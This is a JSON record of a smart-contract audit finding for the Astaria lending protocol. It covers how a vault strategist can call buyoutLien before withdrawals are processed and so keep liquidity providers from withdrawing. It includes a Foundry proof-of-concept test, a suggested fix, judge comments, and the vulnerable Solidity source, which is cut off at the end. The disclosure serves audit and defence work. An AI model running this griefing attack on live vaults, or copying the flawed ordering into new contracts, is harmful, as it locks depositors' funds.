{
  "Title": "[M-18] Public vault owner (strategist) can use buyoutLien to indefinitely prevent liquidity providers from withdrawing",
  "Content": "\nBy calling buyoutLien before transferWithdrawReserve() is invoked (front-run if necessary), Public vault owner (strategist) can indefinitely prevent liquidity providers from withdrawing. He now effectively owns all the fund in the public vault.\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2023-01-astaria/blob/main/src/VaultImplementation.sol#L295><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/main/src/PublicVault.sol#L421>\n\nBefore commitLien, transferWithdrawReserve() is invoked to transfer available funds from the public vault to the withdrawProxy of the previous epoch. However, this is not the case for buyoutLien.\n\n<https://github.com/code-423n4/2023-01-astaria/blob/main/src/PublicVault.sol#L372-L382>\n\nAs soon as there's fund is available in the vault, the strategist can call buyoutLien before any calls to transferWithdrawReserve(), and the withdrawProxy will need to continue to wait for available fund.\n\nThe only thing that can break this cycle is a liquidation, but the strategist can prevent this from happening by only buying out liens from vaults he control where he only lends out to himself.\n\nConsider the following test. Even though there is enough fund in the vault for the liquidity provider's withdrawal (60 ether), only less than 20 ethers ended up in the withdrawProxy when transferWithdrawReserve() is preceeded by buyoutLien().\n\n    pragma solidity =0.8.17;\n\n    import \"forge-std/Test.sol\";\n\n    import {Authority} from \"solmate/auth/Auth.sol\";\n    import {FixedPointMathLib} from \"solmate/utils/FixedPointMathLib.sol\";\n    import {MockERC721} from \"solmate/test/utils/mocks/MockERC721.sol\";\n    import {\n      MultiRolesAuthority\n    } from \"solmate/auth/authorities/MultiRolesAuthority.sol\";\n\n    import {ERC721} from \"gpl/ERC721.sol\";\n    import {SafeCastLib} from \"gpl/utils/SafeCastLib.sol\";\n\n    import {IAstariaRouter, AstariaRouter} from \"../AstariaRouter.sol\";\n    import {VaultImplementation} from \"../VaultImplementation.sol\";\n    import {PublicVault} from \"../PublicVault.sol\";\n    import {TransferProxy} from \"../TransferProxy.sol\";\n    import {WithdrawProxy} from \"../WithdrawProxy.sol\";\n\n    import {Strings2} from \"./utils/Strings2.sol\";\n\n    import \"./TestHelpers.t.sol\";\n    import {OrderParameters} from \"seaport/lib/ConsiderationStructs.sol\";\n\n    contract AstariaTest is TestHelpers {\n      using FixedPointMathLib for uint256;\n      using CollateralLookup for address;\n      using SafeCastLib for uint256;\n\n      event NonceUpdated(uint256 nonce);\n      event VaultShutdown();\n\n      function testBuyoutBeforeWithdraw() public {\n        TestNFT nft = new TestNFT(1);\n        address tokenContract = address(nft);\n        uint256 tokenId = uint256(0);\n\n        address publicVault = _createPublicVault({\n          strategist: strategistOne,\n          delegate: strategistTwo,\n          epochLength: 7 days\n        });\n        _lendToVault(\n          Lender({addr: address(1), amountToLend: 60 ether}),\n          publicVault\n        );\n\n        address publicVault2 = _createPublicVault({\n          strategist: strategistOne,\n          delegate: strategistTwo,\n          epochLength: 7 days\n        });\n        _lendToVault(\n          Lender({addr: address(1), amountToLend: 60 ether}),\n          publicVault2\n        );\n\n        (, ILienToken.Stack[] memory stack) = _commitToLien({\n          vault: publicVault,\n          strategist: strategistOne,\n          strategistPK: strategistOnePK,\n          tokenContract: tokenContract,\n          tokenId: tokenId,\n          lienDetails: standardLienDetails,\n          amount: 40 ether,\n          isFirstLien: true\n        });\n\n        vm.warp(block.timestamp + 3 days);\n\n        IAstariaRouter.Commitment memory refinanceTerms = _generateValidTerms({\n          vault: publicVault2,\n          strategist: strategistOne,\n          strategistPK: strategistOnePK,\n          tokenContract: tokenContract,\n          tokenId: tokenId,\n          lienDetails: ILienToken.Details({\n            maxAmount: 50 ether,\n            rate: (uint256(1e16) * 70) / (365 days),\n            duration: 25 days,\n            maxPotentialDebt: 53 ether,\n            liquidationInitialAsk: 500 ether\n          }),\n          amount: 10 ether,\n          stack: stack\n        });\n\n        _signalWithdraw(address(1), publicVault2);\n        _warpToEpochEnd(publicVault2);\n        PublicVault(publicVault2).processEpoch();\n\n        \n        VaultImplementation(publicVault2).buyoutLien(\n          stack,\n          uint8(0),\n          refinanceTerms\n        );\n        \n\n        PublicVault(publicVault2).transferWithdrawReserve();\n\n        WithdrawProxy withdrawProxy = PublicVault(publicVault2).getWithdrawProxy(0);\n\n        assertTrue(WETH9.balanceOf(address(withdrawProxy)) < 20 ether);\n        \n      }\n    }\n\n### Tools Used\n\nVSCode, Foundry\n\n### Recommended Mitigation Steps\n\nEnforce a call to transferWithdrawReserve() before a buyout executes (similar to commitLien).\n\n**[SantiagoGregory (Astaria) confirmed and commented](https://github.com/code-423n4/2023-01-astaria-findings/issues/324#issuecomment-1405972473):**\n > @androolloyd - should this still be high severity? This may be a strategist trust issue, but it is more malicious than just writing bad loan terms.\n\n**[SantiagoGregory (Astaria) disagreed with severity and commented](https://github.com/code-423n4/2023-01-astaria-findings/issues/324#issuecomment-1418314799):**\n > Since this is more of a strategist trust issue, we think this would make more sense as medium severity. Even with the fix, the issue of malicious refinancing would still partially exist.\n\n**[Picodes (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-01-astaria-findings/issues/324#issuecomment-1435723056):**\n > I do agree with Medium severity, considering it is a griefing attack by the strategist.\n\n\n\n***\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/reports/2023-01-astaria",
  "Code": [
    {
      "filename": "src/VaultImplementation.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\n\n/**                                                     \n*  █████╗ ███████╗████████╗ █████╗ ██████╗ ██╗ █████╗ \n* ██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██║██╔══██╗\n* ███████║███████╗   ██║   ███████║██████╔╝██║███████║\n* ██╔══██║╚════██║   ██║   ██╔══██║██╔══██╗██║██╔══██║\n* ██║  ██║███████║   ██║   ██║  ██║██║  ██║██║██║  ██║\n* ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝\n*\n* Astaria Labs, Inc\n*/\n\npragma solidity =0.8.17;\n\nimport {ERC20} from \"solmate/tokens/ERC20.sol\";\nimport {ERC721, ERC721TokenReceiver} from \"solmate/tokens/ERC721.sol\";\nimport {FixedPointMathLib} from \"solmate/utils/FixedPointMathLib.sol\";\nimport {SafeTransferLib} from \"solmate/utils/SafeTransferLib.sol\";\nimport {CollateralLookup} from \"core/libraries/CollateralLookup.sol\";\n\nimport {IAstariaRouter} from \"core/interfaces/IAstariaRouter.sol\";\nimport {LienToken} from \"core/LienToken.sol\";\nimport {ILienToken} from \"core/interfaces/ILienToken.sol\";\nimport {IPublicVault} from \"core/interfaces/IPublicVault.sol\";\nimport {AstariaVaultBase} from \"core/AstariaVaultBase.sol\";\nimport {IVaultImplementation} from \"core/interfaces/IVaultImplementation.sol\";\nimport {SafeCastLib} from \"gpl/utils/SafeCastLib.sol\";\n\n/**\n * @title VaultImplementation\n * @notice A base implementation for the minimal features of an Astaria Vault.\n */\nabstract contract VaultImplementation is\n  AstariaVaultBase,\n  ERC721TokenReceiver,\n  IVaultImplementation\n{\n  using SafeTransferLib for ERC20;\n  using SafeCastLib for uint256;\n  using CollateralLookup for address;\n  using FixedPointMathLib for uint256;\n\n  bytes32 public constant STRATEGY_TYPEHASH =\n    keccak256(\"StrategyDetails(uint256 nonce,uint256 deadline,bytes32 root)\");\n\n  bytes32 constant EIP_DOMAIN =\n    keccak256(\n      \"EIP712Domain(string version,uint256 chainId,address verifyingContract)\"\n    );\n  bytes32 constant VERSION = keccak256(\"0\");\n\n  function name() external view virtual override returns (string memory);\n\n  function symbol() external view virtual override returns (string memory);\n\n  uint256 private constant VI_SLOT =\n    uint256(keccak256(\"xyz.astaria.VaultImplementation.storage.location\")) - 1;\n\n  function getStrategistNonce() external view returns (uint256) {\n    return _loadVISlot().strategistNonce;\n  }\n\n  function incrementNonce() external {\n    VIData storage s = _loadVISlot();\n    if (msg.sender != owner() && msg.sender != s.delegate) {\n      revert InvalidRequest(InvalidRequestReason.NO_AUTHORITY);\n    }\n    s.strategistNonce++;\n    emit NonceUpdated(s.strategistNonce);\n  }\n\n  /**\n   * @notice modify the deposit cap for the vault\n   * @param newCap The deposit cap.\n   */\n  function modifyDepositCap(uint256 newCap) external {\n    require(msg.sender == owner()); //owner is \"strategist\"\n    _loadVISlot().depositCap = newCap.safeCastTo88();\n  }\n\n  function _loadVISlot() internal pure returns (VIData storage s) {\n    uint256 slot = VI_SLOT;\n\n    assembly {\n      s.slot := slot\n    }\n  }\n\n  /**\n   * @notice modify the allowlist for the vault\n   * @param depositor the depositor to modify\n   * @param enabled the status of the depositor\n   */\n  function modifyAllowList(address depositor, bool enabled) external virtual {\n    require(msg.sender == owner()); //owner is \"strategist\"\n    _loadVISlot().allowList[depositor] = enabled;\n    emit AllowListUpdated(depositor, enabled);\n  }\n\n  /**\n   * @notice disable the allowList for the vault\n   */\n  function disableAllowList() external virtual {\n    require(msg.sender == owner()); //owner is \"strategist\"\n    _loadVISlot().allowListEnabled = false;\n    emit AllowListEnabled(false);\n  }\n\n  /**\n   * @notice enable the allowList for the vault\n   */\n  function enableAllowList() external virtual {\n    require(msg.sender == owner()); //owner is \"strategist\"\n    _loadVISlot().allowListEnabled = true;\n    emit AllowListEnabled(true);\n  }\n\n  /**\n   * @notice receive hook for ERC721 tokens, nothing special done\n   */\n  function onERC721Received(\n    address, // operator_\n    address, // from_\n    uint256, // tokenId_\n    bytes calldata // data_\n  ) external pure override returns (bytes4) {\n    return ERC721TokenReceiver.onERC721Received.selector;\n  }\n\n  modifier whenNotPaused() {\n    if (ROUTER().paused()) {\n      revert InvalidRequest(InvalidRequestReason.PAUSED);\n    }\n\n    if (_loadVISlot().isShutdown) {\n      revert InvalidRequest(InvalidRequestReason.SHUTDOWN);\n    }\n    _;\n  }\n\n  function getShutdown() external view returns (bool) {\n    return _loadVISlot().isShutdown;\n  }\n\n  function shutdown() external {\n    require(msg.sender == owner()); //owner is \"strategist\"\n    _loadVISlot().isShutdown = true;\n    emit VaultShutdown();\n  }\n\n  function domainSeparator() public view virtual returns (bytes32) {\n    return\n      keccak256(\n        abi.encode(\n          EIP_DOMAIN,\n          VERSION, //version\n          block.chainid,\n          address(this)\n        )\n      );\n  }\n\n  /*\n   * @notice encodes the data for a 712 signature\n   * @param tokenContract The address of the token contract\n   * @param tokenId The id of the token\n   * @param amount The amount of the token\n   */\n  function encodeStrategyData(\n    IAstariaRouter.StrategyDetailsParam calldata strategy,\n    bytes32 root\n  ) external view returns (bytes memory) {\n    VIData storage s = _loadVISlot();\n    return _encodeStrategyData(s, strategy, root);\n  }\n\n  function _encodeStrategyData(\n    VIData storage s,\n    IAstariaRouter.StrategyDetailsParam calldata strategy,\n    bytes32 root\n  ) internal view returns (bytes memory) {\n    bytes32 hash = keccak256(\n      abi.encode(STRATEGY_TYPEHASH, s.strategistNonce, strategy.deadline, root)\n    );\n    return\n      abi.encodePacked(bytes1(0x19), bytes1(0x01), domainSeparator(), hash);\n  }\n\n  function init(InitParams calldata params) external virtual {\n    require(msg.sender == address(ROUTER()));\n    VIData storage s = _loadVISlot();\n\n    if (params.delegate != address(0)) {\n      s.delegate = params.delegate;\n    }\n    s.depositCap = params.depositCap.safeCastTo88();\n    if (params.allowListEnabled) {\n      s.allowListEnabled = true;\n      uint256 i;\n      for (; i < params.allowList.length; ) {\n        s.allowList[params.allowList[i]] = true;\n        unchecked {\n          ++i;\n        }\n      }\n    }\n  }\n\n  function setDelegate(address delegate_) external {\n    require(msg.sender == owner()); //owner is \"strategist\"\n    VIData storage s = _loadVISlot();\n    s.delegate = delegate_;\n    emit DelegateUpdated(delegate_);\n    emit AllowListUpdated(delegate_, true);\n  }\n\n  /**\n   * @dev Validates the terms for a requested loan.\n   * Who is requesting the borrow, is it a smart contract? or is it a user?\n   * if a smart contract, then ensure that the contract is approved to borrow and is also receiving the funds.\n   * if a user, then ensure that the user is approved to borrow and is also receiving the funds.\n   * The terms are hashed and signed by the borrower, and the signature validated against the strategist's address\n   * lien details are decoded from the obligation data and validated the collateral\n   *\n   * @param params The Commitment information containing the loan parameters and the merkle proof for the strategy supporting the requested loan.\n   * @param receiver The address of the prospective borrower.\n   */\n  function _validateCommitment(\n    IAstariaRouter.Commitment calldata params,\n    address receiver\n  ) internal view {\n    uint256 collateralId = params.tokenContract.computeId(params.tokenId);\n    ERC721 CT = ERC721(address(COLLATERAL_TOKEN()));\n    address holder = CT.ownerOf(collateralId);\n    address operator = CT.getApproved(collateralId);\n    if (\n      msg.sender != holder &&\n      receiver != holder &&\n      receiver != operator &&\n      !CT.isApprovedForAll(holder, msg.sender)\n    ) {\n      revert InvalidRequest(InvalidRequestReason.NO_AUTHORITY);\n    }\n    VIData storage s = _loadVISlot();\n    address recovered = ecrecover(\n      keccak256(\n        _encodeStrategyData(\n          s,\n          params.lienRequest.strategy,\n          params.lienRequest.merkle.root\n        )\n      ),\n      params.lienRequest.v,\n      params.lienRequest.r,\n      params.lienRequest.s\n    );\n    if (\n      (recovered != owner() && recovered != s.delegate) ||\n      recovered == address(0)\n    ) {\n      revert IVaultImplementation.InvalidRequest(\n        InvalidRequestReason.INVALID_SIGNATURE\n      );\n    }\n  }\n\n  function _afterCommitToLien(\n    uint40 end,\n    uint256 lienId,\n    uint256 slope\n  ) internal virtual {}\n\n  function _beforeCommitToLien(IAstariaRouter.Commitment calldata)\n    internal\n    virtual\n  {}\n\n  /**\n   * @notice Pipeline for lifecycle of new loan origination.\n   * Origination consists of a few phases: pre-commitment validation, lien token issuance, strategist reward, and after commitment actions\n   * Starts by depositing collateral and take optimized-out a lien against it. Next, verifies the merkle proof for a loan commitment. Vault owners are then rewarded fees for successful loan origination.\n   * @param params Commitment data for the incoming lien request\n   * @param receiver The borrower receiving the loan.\n   * @return lienId The id of the newly minted lien token.\n   */\n  function commitToLien(\n    IAstariaRouter.Commitment calldata params,\n    address receiver\n  )\n    external\n    whenNotPaused\n    returns (uint256 lienId, ILienToken.Stack[] memory stack, uint256 payout)\n  {\n    _beforeCommitToLien(params);\n    uint256 slopeAddition;\n    (lienId, stack, slopeAddition, payout) = _requestLienAndIssuePayout(\n      params,\n      receiver\n    );\n    _afterCommitToLien(\n      stack[stack.length - 1].point.end,\n      lienId,\n      slopeAddition\n    );\n  }\n\n  /**\n   * @notice Buy optimized-out a lien to replace it with new terms.\n   * @param position The position of the specified lien.\n   * @param incomingTerms The loan terms of the new lien.\n   */\n  function buyoutLien(\n    ILienToken.Stack[] calldata stack,\n    uint8 position,\n    IAstariaRouter.Commitment calldata incomingTerms\n  )\n    external\n    whenNotPaused\n    returns (ILienToken.Stack[] memory, ILienToken.Stack memory)\n  {\n    LienToken lienToken = LienToken(address(ROUTER().LIEN_TOKEN()));\n\n    (uint256 owed, uint256 buyout) = lienToken.getBuyout(stack[position]);\n\n    if (buyout > ERC20(asset()).balanceOf(address(this))) {\n      revert IVaultImplementation.InvalidRequest(\n        InvalidRequestReason.INSUFFICIENT_FUNDS\n      );\n    }\n\n    _validateCommitment(incomingTerms, recipient());\n\n    ERC20(asset()).safeApprove(address(ROUTER().TRANSFER_PROXY()), buyout);\n\n    return\n      lienToken.buyoutLien(\n        ILienToken.LienActionBuyout({\n          position: position,\n          encumber: ILienToken.LienActionEncumber({\n            amount: owed,\n            receiver: recipient(),\n            lien: ROUTER().validateCommitment({\n              commitment: incomingTerms,\n              timeToSecondEpochEnd: _timeToSecondEndIfPublic()\n            }),\n            stack: stack\n          })\n        })\n      );\n  }\n\n  function _timeToSecondEndIfPublic()\n    internal\n    view\n    virtual\n    returns (uint256 timeToSecondEpochEnd)\n  {\n    return 0;\n  }\n\n  /**\n   * @notice Retrieves the recipient of loan repayments. For PublicVaults (VAULT_TYPE 2), this is always the vault address. For PrivateVaults, retrieves the owner() of the vault.\n   * @return The address of the recipient.\n   */\n  function recipient() public view returns (address) {\n    if (IMPL_TYPE() == uint8(IAstariaRouter.ImplementationType.PublicVault)) {\n      return address(this);\n    } else {\n      return owner();\n    }\n  }\n\n  /**\n   * @dev Generates a Lien for a valid loan commitment proof and sends the loan amount to the borrower.\n   * @param c The Commitment information containing the loan parameters and the merkle proof for the strategy supporting the requested loan.\n   * @param receiver The borrower requesting the loan.\n   */\n  function _requestLienAndIssuePayout(\n    IAstariaRouter.Commitment calldata c,\n    address receiver\n  )\n    internal\n    returns (\n      uint256 newLienId,\n      ILienToken.Stack[] memory stack,\n      uint256 slope,\n      uint256 payout\n    )\n  {\n    _validateCommitment(c, receiver);\n    (newLienId, stack, slope) = ROUTER().requestLienPosition(c, recipient());\n    payout = _handleProtocolFee(c.lienRequest.amount);\n    ERC20(asset()).safeTransfer(receiver, payout);\n  }\n\n  function _handleProtocolFee(uint256 amount) internal returns (uint256) {\n    address feeTo = ROUTER().feeTo();\n    bool feeOn = feeTo != address(0);\n    if (feeOn) {\n      uint256 fee = ROUTER().getProtocolFee(amount);\n\n      unchecked {\n        amount -= fee;\n      }\n      ERC20(asset()).safeTransfer(feeTo, fee);\n    }\n    return amount;\n  }\n}"
    },
    {
      "filename": "src/PublicVault.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\n\n/**\n *  █████╗ ███████╗████████╗ █████╗ ██████╗ ██╗ █████╗\n * ██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██║██╔══██╗\n * ███████║███████╗   ██║   ███████║██████╔╝██║███████║\n * ██╔══██║╚════██║   ██║   ██╔══██║██╔══██╗██║██╔══██║\n * ██║  ██║███████║   ██║   ██║  ██║██║  ██║██║██║  ██║\n * ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝\n *\n * Astaria Labs, Inc\n */\n\npragma solidity =0.8.17;\n\nimport {ERC20} from \"solmate/tokens/ERC20.sol\";\nimport {ERC4626} from \"solmate/mixins/ERC4626.sol\";\nimport {FixedPointMathLib} from \"solmate/utils/FixedPointMathLib.sol\";\nimport {SafeTransferLib} from \"solmate/utils/SafeTransferLib.sol\";\nimport {SafeCastLib} from \"gpl/utils/SafeCastLib.sol\";\n\nimport {IERC165} from \"core/interfaces/IERC165.sol\";\nimport {ERC4626Cloned} from \"gpl/ERC4626-Cloned.sol\";\nimport {IERC4626} from \"core/interfaces/IERC4626.sol\";\nimport {IERC20} from \"core/interfaces/IERC20.sol\";\nimport {IERC20Metadata} from \"core/interfaces/IERC20Metadata.sol\";\nimport {ERC20Cloned} from \"gpl/ERC20-Cloned.sol\";\nimport {\n  ClonesWithImmutableArgs\n} from \"clones-with-immutable-args/ClonesWithImmutableArgs.sol\";\n\nimport {IAstariaRouter} from \"core/interfaces/IAstariaRouter.sol\";\nimport {ILienToken} from \"core/interfaces/ILienToken.sol\";\n\nimport {VaultImplementation} from \"core/VaultImplementation.sol\";\nimport {WithdrawProxy} from \"core/WithdrawProxy.sol\";\n\nimport {Math} from \"core/utils/Math.sol\";\nimport {IPublicVault} from \"core/interfaces/IPublicVault.sol\";\nimport {IAstariaVaultBase} from \"core/interfaces/IAstariaVaultBase.sol\";\nimport {AstariaVaultBase} from \"core/AstariaVaultBase.sol\";\n\n/*\n * @title PublicVault\n * @author androolloyd\n * @notice\n */\ncontract PublicVault is VaultImplementation, IPublicVault, ERC4626Cloned {\n  using FixedPointMathLib for uint256;\n  using SafeTransferLib for ERC20;\n  using SafeCastLib for uint256;\n\n  uint256 private constant PUBLIC_VAULT_SLOT =\n    uint256(keccak256(\"xyz.astaria.PublicVault.storage.location\")) - 1;\n\n  function asset()\n    public\n    pure\n    virtual\n    override(IAstariaVaultBase, AstariaVaultBase, ERC4626Cloned)\n    returns (address)\n  {\n    return super.asset();\n  }\n\n  function decimals()\n    public\n    pure\n    virtual\n    override(IERC20Metadata)\n    returns (uint8)\n  {\n    return 18;\n  }\n\n  function name()\n    public\n    view\n    virtual\n    override(IERC20Metadata, VaultImplementation)\n    returns (string memory)\n  {\n    return string(abi.encodePacked(\"AST-Vault-\", ERC20(asset()).symbol()));\n  }\n\n  function symbol()\n    public\n    view\n    virtual\n    override(IERC20Metadata, VaultImplementation)\n    returns (string memory)\n  {\n    return string(abi.encodePacked(\"AST-V-\", ERC20(asset()).symbol()));\n  }\n\n  function minDepositAmount()\n    public\n    view\n    virtual\n    override(ERC4626Cloned)\n    returns (uint256)\n  {\n    if (ERC20(asset()).decimals() == uint8(18)) {\n      return 100 gwei;\n    } else {\n      return 10**(ERC20(asset()).decimals() - 1);\n    }\n  }\n\n  /**\n   * @notice Signal a withdrawal of funds (redeeming for underlying asset) in the next epoch.\n   * @param shares The number of VaultToken shares to redeem.\n   * @param receiver The receiver of the WithdrawTokens (and eventual underlying asset)\n   * @param owner The owner of the VaultTokens.\n   * @return assets The amount of the underlying asset redeemed.\n   */\n  function redeem(\n    uint256 shares,\n    address receiver,\n    address owner\n  ) public virtual override(ERC4626Cloned) returns (uint256 assets) {\n    VaultData storage s = _loadStorageSlot();\n    assets = _redeemFutureEpoch(s, shares, receiver, owner, s.currentEpoch);\n  }\n\n  function withdraw(\n    uint256 assets,\n    address receiver,\n    address owner\n  ) public virtual override(ERC4626Cloned) returns (uint256 shares) {\n    shares = previewWithdraw(assets);\n\n    VaultData storage s = _loadStorageSlot();\n\n    _redeemFutureEpoch(s, shares, receiver, owner, s.currentEpoch);\n  }\n\n  function redeemFutureEpoch(\n    uint256 shares,\n    address receiver,\n    address owner,\n    uint64 epoch\n  ) public virtual returns (uint256 assets) {\n    return\n      _redeemFutureEpoch(_loadStorageSlot(), shares, receiver, owner, epoch);\n  }\n\n  function _redeemFutureEpoch(\n    VaultData storage s,\n    uint256 shares,\n    address receiver,\n    address owner,\n    uint64 epoch\n  ) internal virtual returns (uint256 assets) {\n    // check to ensure that the requested epoch is not in the past\n\n    ERC20Data storage es = _loadERC20Slot();\n\n    if (msg.sender != owner) {\n      uint256 allowed = es.allowance[owner][msg.sender]; // Saves gas for limited approvals.\n\n      if (allowed != type(uint256).max) {\n        es.allowance[owner][msg.sender] = allowed - shares;\n      }\n    }\n\n    if (epoch < s.currentEpoch) {\n      revert InvalidState(InvalidStates.EPOCH_TOO_LOW);\n    }\n    require((assets = previewRedeem(shares)) != 0, \"ZERO_ASSETS\");\n    // check for rounding error since we round down in previewRedeem.\n\n    //this will underflow if not enough balance\n    es.balanceOf[owner] -= shares;\n\n    // Cannot overflow because the sum of all user\n    // balances can't exceed the max uint256 value.\n    unchecked {\n      es.balanceOf[address(this)] += shares;\n    }\n\n    emit Transfer(owner, address(this), shares);\n    // Deploy WithdrawProxy if no WithdrawProxy exists for the specified epoch\n    _deployWithdrawProxyIfNotDeployed(s, epoch);\n\n    emit Withdraw(msg.sender, receiver, owner, assets, shares);\n\n    // WithdrawProxy shares are minted 1:1 with PublicVault shares\n    WithdrawProxy(s.epochData[epoch].withdrawProxy).mint(shares, receiver);\n  }\n\n  function getWithdrawProxy(uint64 epoch) public view returns (WithdrawProxy) {\n    return WithdrawProxy(_loadStorageSlot().epochData[epoch].withdrawProxy);\n  }\n\n  function getCurrentEpoch() public view returns (uint64) {\n    return _loadStorageSlot().currentEpoch;\n  }\n\n  function getSlope() public view returns (uint256) {\n    return uint256(_loadStorageSlot().slope);\n  }\n\n  function getWithdrawReserve() public view returns (uint256) {\n    return uint256(_loadStorageSlot().withdrawReserve);\n  }\n\n  function getLiquidationWithdrawRatio() public view returns (uint256) {\n    return uint256(_loadStorageSlot().liquidationWithdrawRatio);\n  }\n\n  function getYIntercept() public view returns (uint256) {\n    return uint256(_loadStorageSlot().yIntercept);\n  }\n\n  function _deployWithdrawProxyIfNotDeployed(VaultData storage s, uint64 epoch)\n    internal\n  {\n    if (s.epochData[epoch].withdrawProxy == address(0)) {\n      s.epochData[epoch].withdrawProxy = ClonesWithImmutableArgs.clone(\n        IAstariaRouter(ROUTER()).BEACON_PROXY_IMPLEMENTATION(),\n        abi.encodePacked(\n          address(ROUTER()), // router is the beacon\n          uint8(IAstariaRouter.ImplementationType.WithdrawProxy),\n          asset(), // token\n          address(this), // vault\n          epoch + 1 // claimable epoch\n        )\n      );\n    }\n  }\n\n  function mint(uint256 shares, address receiver)\n    public\n    override(ERC4626Cloned)\n    whenNotPaused\n    returns (uint256)\n  {\n    VIData storage s = _loadVISlot();\n    if (s.allowListEnabled) {\n      require(s.allowList[receiver]);\n    }\n    return super.mint(shares, receiver);\n  }\n\n  /**\n   * @notice Deposit funds into the PublicVault.\n   * @param amount The amount of funds to deposit.\n   * @param receiver The receiver of the resulting VaultToken shares.\n   */\n  function deposit(uint256 amount, address receiver)\n    public\n    override(ERC4626Cloned)\n    whenNotPaused\n    returns (uint256)\n  {\n    VIData storage s = _loadVISlot();\n    if (s.allowListEnabled) {\n      require(s.allowList[receiver]);\n    }\n\n    uint256 assets = totalAssets();\n\n    return super.deposit(amount, receiver);\n  }\n\n  /**\n   * @notice Retrieve the domain separator.\n   * @return The domain separator.\n   */\n  function computeDomainSeparator() internal view override returns (bytes32) {\n    return super.domainSeparator();\n  }\n\n  function processEpoch() public {\n    // check to make sure epoch is over\n    if (timeToEpochEnd() > 0) {\n      revert InvalidState(InvalidStates.EPOCH_NOT_OVER);\n    }\n    VaultData storage s = _loadStorageSlot();\n\n    if (s.withdrawReserve > 0) {\n      revert InvalidState(InvalidStates.WITHDRAW_RESERVE_NOT_ZERO);\n    }\n\n    WithdrawProxy currentWithdrawProxy = WithdrawProxy(\n      s.epochData[s.currentEpoch].withdrawProxy\n    );\n\n    // split funds from previous WithdrawProxy with PublicVault if hasn't been already\n    if (s.currentEpoch != 0) {\n      WithdrawProxy previousWithdrawProxy = WithdrawProxy(\n        s.epochData[s.currentEpoch - 1].withdrawProxy\n      );\n      if (\n        address(previousWithdrawProxy) != address(0) &&\n        previousWithdrawProxy.getFinalAuctionEnd() != 0\n      ) {\n        previousWithdrawProxy.claim();\n      }\n    }\n\n    if (s.epochData[s.currentEpoch].liensOpenForEpoch > 0) {\n      revert InvalidState(InvalidStates.LIENS_OPEN_FOR_EPOCH_NOT_ZERO);\n    }\n\n    // reset liquidationWithdrawRatio to prepare for re calcualtion\n    s.liquidationWithdrawRatio = 0;\n\n    // check if there are LPs withdrawing this epoch\n    if ((address(currentWithdrawProxy) != address(0))) {\n      uint256 proxySupply = currentWithdrawProxy.totalSupply();\n\n      s.liquidationWithdrawRatio = proxySupply\n        .mulDivDown(1e18, totalSupply())\n        .safeCastTo88();\n\n      currentWithdrawProxy.setWithdrawRatio(s.liquidationWithdrawRatio);\n      uint256 expected = currentWithdrawProxy.getExpected();\n\n      unchecked {\n        if (totalAssets() > expected) {\n          s.withdrawReserve = (totalAssets() - expected)\n            .mulWadDown(s.liquidationWithdrawRatio)\n            .safeCastTo88();\n        } else {\n          s.withdrawReserve = 0;\n        }\n      }\n      _setYIntercept(\n        s,\n        s.yIntercept -\n          totalAssets().mulDivDown(s.liquidationWithdrawRatio, 1e18)\n      );\n      // burn the tokens of the LPs withdrawing\n      _burn(address(this), proxySupply);\n    }\n\n    // increment epoch\n    unchecked {\n      s.currentEpoch++;\n    }\n  }\n\n  function supportsInterface(bytes4 interfaceId)\n    public\n    pure\n    override(IERC165)\n    returns (bool)\n  {\n    return\n      interfaceId == type(IPublicVault).interfaceId ||\n      interfaceId == type(ERC4626Cloned).interfaceId ||\n      interfaceId == type(ERC4626).interfaceId ||\n      interfaceId == type(ERC20).interfaceId ||\n      interfaceId == type(IERC165).interfaceId;\n  }\n\n  function transferWithdrawReserve() public {\n    VaultData storage s = _loadStorageSlot();\n\n    if (s.currentEpoch == uint64(0)) {\n      return;\n    }\n\n    address currentWithdrawProxy = s\n      .epochData[s.currentEpoch - 1]\n      .withdrawProxy;\n    // prevents transfer to a non-existent WithdrawProxy\n    // withdrawProxies are indexed by the epoch where they're deployed\n    if (currentWithdrawProxy != address(0)) {\n      uint256 withdrawBalance = ERC20(asset()).balanceOf(address(this));\n\n      // prevent transfer of more assets then are available\n      if (s.withdrawReserve <= withdrawBalance) {\n        withdrawBalance = s.withdrawReserve;\n        s.withdrawReserve = 0;\n      } else {\n        unchecked {\n          s.withdrawReserve -= withdrawBalance.safeCastTo88();\n        }\n      }\n\n      ERC20(asset()).safeTransfer(currentWithdrawProxy, withdrawBalance);\n      WithdrawProxy(currentWithdrawProxy).increaseWithdrawReserveReceived(\n        withdrawBalance\n      );\n      emit WithdrawReserveTransferred(withdrawBalance);\n    }\n\n    address withdrawProxy = s.epochData[s.currentEpoch].withdrawProxy;\n    if (\n      s.withdrawReserve > 0 &&\n      timeToEpochEnd() == 0 &&\n      withdrawProxy != address(0)\n    ) {\n      address currentWithdrawProxy = s\n        .epochData[s.currentEpoch - 1]\n        .withdrawProxy;\n      uint256 drainBalance = WithdrawProxy(withdrawProxy).drain(\n        s.withdrawReserve,\n        s.epochData[s.currentEpoch - 1].withdrawProxy\n      );\n      unchecked {\n        s.withdrawReserve -= drainBalance.safeCastTo88();\n      }\n      WithdrawProxy(currentWithdrawProxy).increaseWithdrawReserveReceived(\n        drainBalance\n      );\n    }\n  }\n\n  function _beforeCommitToLien(IAstariaRouter.Commitment calldata params)\n    internal\n    virtual\n    override(VaultImplementation)\n  {\n    VaultData storage s = _loadStorageSlot();\n\n    if (s.withdrawReserve > uint256(0)) {\n      transferWithdrawReserve();\n    }\n    if (timeToEpochEnd() == uint256(0)) {\n      processEpoch();\n    }\n  }\n\n  function _loadStorageSlot() internal pure returns (VaultData storage s) {\n    uint256 slot = PUBLIC_VAULT_SLOT;\n    assembly {\n      s.slot := slot\n    }\n  }\n\n  /**\n   * @dev Hook for updating the slope of the PublicVault after a LienToken is issued.\n   * @param lienId The ID of the lien.\n   */\n  function _afterCommitToLien(\n    uint40 lienEnd,\n    uint256 lienId,\n    uint256 